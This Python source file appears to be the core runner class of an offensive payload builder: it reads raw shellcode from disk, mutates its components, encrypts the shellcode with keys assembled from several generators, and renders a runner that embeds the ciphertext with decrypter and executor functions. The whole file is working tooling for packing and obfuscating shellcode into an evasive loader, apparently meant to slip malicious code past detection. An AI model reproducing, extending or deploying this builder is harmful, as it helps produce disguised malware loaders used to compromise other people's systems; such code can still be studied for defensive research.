import config
import json

from base.de_component import DEComponent
from base.has_cli import HasCLI

class RunnerInterface(DEComponent):

    def __init__(self):


        self.required_attrs([

            'payload_main',
            'inner_shell',
            'imports',
            'shellcode_format',
        ])

        self.key_transfer_interface = []
        self.key_parts = []
        
        super().__init__()

    def initialize(self, dispatch, options):
    
        self.dispatch = dispatch
        self.options = options

    def mutate(self):

        mutator = self.dispatch['mutator']

        for key in self.dispatch:

            if config.debug:
                print(key)

            if key in ['mutator', 'interface']:
                continue

            elif key in ['postmodules', 'premodules', 'dkeys']:
                for prepostkey in self.dispatch[key]:
                    prepostkey.mutate(mutator)

            elif hasattr(self.dispatch[key], 'mutate'):
                self.dispatch[key].mutate(mutator)

        self.payload_main.mutate(mutator)

    def merge_imports(self):

        for key in self.dispatch:

            if config.debug:
                print(key)

            if key in ['interface', 'mutator', 'interface', 'ekey', 'crypter']:
                continue

            if key in ['postmodules', 'premodules', 'dkeys']:
                for prepostkey in self.dispatch[key]:
                    self.imports.add(prepostkey.imports)

            elif hasattr(self.dispatch[key], 'imports'):
                print(key)
                self.imports.add(self.dispatch[key].imports)

    def create_payload(self):

        self.mutate()
        self.merge_imports()

        self.merge_keys()
        self.encrypt()
        self.set_special()

        return self.render()

    def merge_keys(self):

        for ekey in self.dispatch['ekeys']:
            ekey_data = ekey.generate()
            ekey_data['val_array'] = self.shellcode_format.render(ekey_data['val'])
            self.key_transfer_interface.append(ekey_data)
            self.key_parts.append(ekey_data['val'])

        self.full_ekey = b''.join(self.key_parts)

    def encrypt(self):

        #self.ekey_data = self.dispatch['ekey'].generate()


        #self.ekey_data['val_array'] = self.shellcode_format.render(self.ekey_data['val'])
        #if config.debug:
        #    print(json.dumps(self.options, sort_keys=True, indent=4))

        shellcode_path = self.options['master']['shellcode'] 
        with open(shellcode_path, 'rb') as input_handle:
            shellcode_raw = input_handle.read()
        #self.crypter_data = self.dispatch['crypter'].encrypt(shellcode_raw, self.ekey_data['val'])
        self.crypter_data = self.dispatch['crypter'].encrypt(shellcode_raw, self.full_ekey)
        self.crypter_data['iv_array'] = self.shellcode_format.render(self.crypter_data['iv'])
        self.crypter_data['ct_array'] = self.shellcode_format.render(self.crypter_data['ct'])
        if config.debug:
            print(self.crypter_data)
        

    def set_special(self):

        decrypter_func = self.dispatch['decrypter'].func_name
        dkey_funcs = [ dkey.func_name for dkey in self.dispatch['dkeys']]
        executor_func = self.dispatch['executor'].func_name
        runner_func_name = self.dispatch['runner'].func_name
        payload_main_func_name = self.payload_main.func_name
        

        # set dkey specials
        #self.dispatch['dkey'].special['ekey_data'] = self.ekey_data
        for dkey,ekey_data in zip(self.dispatch['dkeys'], self.key_transfer_interface):
            dkey.special['ekey_data'] = ekey_data
        #self.dispatch['dkey'].special['ekey_data'] = self.ekey_data

        # set decrypter specials 
        self.dispatch['decrypter'].special['crypter_data'] = self.crypter_data

        # set executor specials
        self.dispatch['executor'].special['executor_func'] = executor_func
        self.dispatch['executor'].special['decrypter_func'] = decrypter_func

        # set premodule specials
        for premodule in self.dispatch['premodules']:
            premodule.special['decrypter_func'] = decrypter_func
            premodule.special['executor_func'] = executor_func

        # set postmodule specials
        for postmodule in self.dispatch['postmodules']:
            postmodule.special['decrypter_func'] = decrypter_func
            postmodule.special['executor_func'] = executor_func

        # set payload main specials
        self.payload_main.special['shellcode'] = self.crypter_data['ct_array']

        self.payload_main.special['decrypter_func'] = decrypter_func
        self.payload_main.special['executor_func'] = executor_func
        self.payload_main.special['dkey_funcs'] = dkey_funcs

        self.payload_main.special['premodule_funcs'] = [
            pre.func_name for pre in self.dispatch['premodules']
        ]

        self.payload_main.special['postmodule_funcs'] = [
            post.func_name for post in self.dispatch['postmodules']
        ]

        # set runner specials
        self.dispatch['runner'].special['payload_main_func_name'] = payload_main_func_name


    def render(self):

        
        rendered_imports = self.imports.render()

        #print(self.inner_shell.rendered_decrypter)
        self.inner_shell.rendered_decrypter = self.dispatch['decrypter'].render()

        self.inner_shell.rendered_executor = self.dispatch['executor'].render()

        #self.inner_shell.rendered_dkey = self.dispatch['dkey'].render()
        for dkey in self.dispatch['dkeys']:
            self.inner_shell.rendered_dkeys.append(dkey.render())

        self.inner_shell.rendered_payload_main = self.payload_main.render()

        for pre in self.dispatch['premodules']:
            self.inner_shell.rendered_pre_modules.append(pre.render())

        for post in self.dispatch['postmodules']:
            self.inner_shell.rendered_post_modules.append(post.render())

        rendered_inner_shell = self.inner_shell.render()
            

        self.dispatch['runner'].rendered_inner_shell = rendered_inner_shell
        self.dispatch['runner'].rendered_imports = rendered_imports
    
        rendered_runner = self.dispatch['runner'].render()

        return rendered_runner
